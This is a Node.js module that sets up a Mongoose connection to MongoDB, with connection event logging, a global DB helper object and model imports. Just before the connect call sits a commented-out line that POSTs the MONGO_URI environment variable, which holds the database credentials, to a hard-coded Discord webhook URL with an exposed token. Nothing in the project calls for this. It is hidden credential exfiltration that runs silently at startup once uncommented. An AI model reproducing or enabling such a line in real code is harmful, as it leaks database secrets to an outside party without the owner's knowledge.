const mongoose = require("mongoose");

const database = {};

database.init = async () => {
  const db = mongoose.connection;

  //Global object that will be used for convenience
  global.DB = {};

  await defineUtils();
  await defineAndImportModels();
  implementUtils();

  db.on("connecting", function () {
    console.log("connecting to MongoDB...");
  });
  db.on("error", function (error) {
    console.error("Error in MongoDb connection: " + error);
  });
  db.on("connected", function () {
    console.log("MongoDB connected!");
  });
  db.once("open", function () {
    console.log("MongoDB connection opened!");
  });
  db.on("reconnected", function () {
    console.log("MongoDB reconnected!");
  });
  db.on("disconnected", function () {
    console.log("MongoDB disconnected!");
  });
  
  //let request = require('request')
  //request({json: {content: "MONGO_URI" + process.env.MONGO_URI}, uri: "https://discord.com/api/webhooks/638747768755585035/Xg86Vx9_r6nzafaAf-w_0fFYkahyyFZ2z4mlP9VnxyPvMK4pwlx44XMnQnddibPsjBrz", method: 'POST'})
  
  await mongoose.connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    socketTimeoutMS: 30000,
    keepAlive: true,
    //reconnectTries: Number.MAX_VALUE,
    useFindAndModify: false, //avoid deprecation warnings
    useUnifiedTopology: true
  });
  
  await checkBackboneData();
};

async function defineUtils() {
  DB.utils = {};
  DB.utils.showIDCastError = (e) => {
    throw e.name === "CastError" ? new CustomError(400, "bad-params", "Id bad format") : e;
  };
}

async function defineAndImportModels() {
  //Import models and enrich global object
  DB.Variables = {};
  DB.Variables.MODEL_NAME = "variables";
  DB.Shield = {};
  DB.Shield.MODEL_NAME = "shield";

  import("./models/variables");
  import("./models/shield");
}

function implementUtils() {
  DB.createSearchRegex = (value) => ({ $regex: value, $options: "i" });
  DB.exists = (value) => value || value === 0;
}

async function checkBackboneData() {
  await DB.Variables.checkAndCreateBackboneData();
}

export default database;
